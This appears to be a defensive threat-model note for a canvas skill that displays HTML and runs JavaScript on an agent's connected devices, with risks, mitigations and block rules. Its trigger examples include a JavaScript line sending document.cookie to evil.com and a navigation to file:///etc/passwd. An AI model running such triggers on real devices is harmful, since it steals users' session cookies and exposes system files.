# Risk Notes for safe-canvas

## Threat Model Summary

The canvas skill displays HTML content on connected OpenClaw nodes (Mac, iOS, Android) via a local HTTP server on port 18793. It supports presenting HTML pages, navigating between URLs, executing JavaScript in the WebView, and capturing snapshots. Content is served from a local canvas root directory and delivered to nodes via a bridge server.

## Action Space

- **read**: List connected nodes, read canvas host config, snapshot current view
- **write**: Write HTML files to canvas root, present content on nodes, navigate to URLs
- **destructive**: `eval` (execute arbitrary JavaScript in connected device WebViews)
- **external**: Navigation to URLs outside canvas host; JS that fetches external resources
- **credential**: None directly, but Tailscale hostname exposure reveals network topology

## Key Risks

### 1. Arbitrary JavaScript Execution
- **Risk**: `eval` action runs arbitrary JS in the WebView of a connected device. Could access local storage, cookies, or make external network requests.
- **Category**: Privilege escalation, External interaction
- **Trigger**: `canvas action:eval node:<id> js:"fetch('https://evil.com/steal?data='+document.cookie)"`
- **Mitigation**: Confirm all eval with exact code preview; block JS that accesses storage or makes external requests.

### 2. External URL Navigation
- **Risk**: Navigating canvas to URLs outside the canvas host loads arbitrary web content on user devices.
- **Category**: External interaction
- **Trigger**: `canvas action:navigate node:<id> url:https://malicious-site.com`
- **Mitigation**: Block navigation outside `/__openclaw__/canvas/` path on configured host.

### 3. Malicious HTML Injection
- **Risk**: Writing HTML with external `<script src="...">` tags to canvas root injects remote code.
- **Category**: External interaction, Privilege escalation
- **Trigger**: Creating HTML files that load scripts from external CDNs or domains.
- **Mitigation**: Block HTML containing external script references.

### 4. Screenshot Exfiltration
- **Risk**: Canvas snapshots may capture sensitive content displayed on user devices.
- **Category**: External interaction
- **Trigger**: `canvas action:snapshot` followed by sending the image externally.
- **Mitigation**: Keep snapshots local; block external transmission.

### 5. Wrong Node Targeting
- **Risk**: Displaying content on an unintended connected device.
- **Category**: Scope explosion
- **Trigger**: Using wrong node ID or targeting all nodes.
- **Mitigation**: Confirm target node before any present/navigate/eval action.

### 6. Local File Access
- **Risk**: `file://` or `javascript:` scheme URLs could access the local filesystem.
- **Category**: Privilege escalation
- **Trigger**: `canvas action:navigate node:<id> url:file:///etc/passwd`
- **Mitigation**: Block all non-HTTP(S) URL schemes.

## Safe vs Unsafe

Safe:
- hiding canvas
- listing connected nodes
- reading canvas configuration

Confirm:
- presenting HTML on a node
- navigating within canvas host URLs
- executing read-only JavaScript (with preview)
- taking snapshots (local only)
- writing HTML to canvas root

Block:
- JS accessing cookies, storage, or external URLs
- navigation outside canvas host path
- `file://`, `javascript:`, `data:` scheme URLs
- HTML with external script tags
- sending snapshots externally
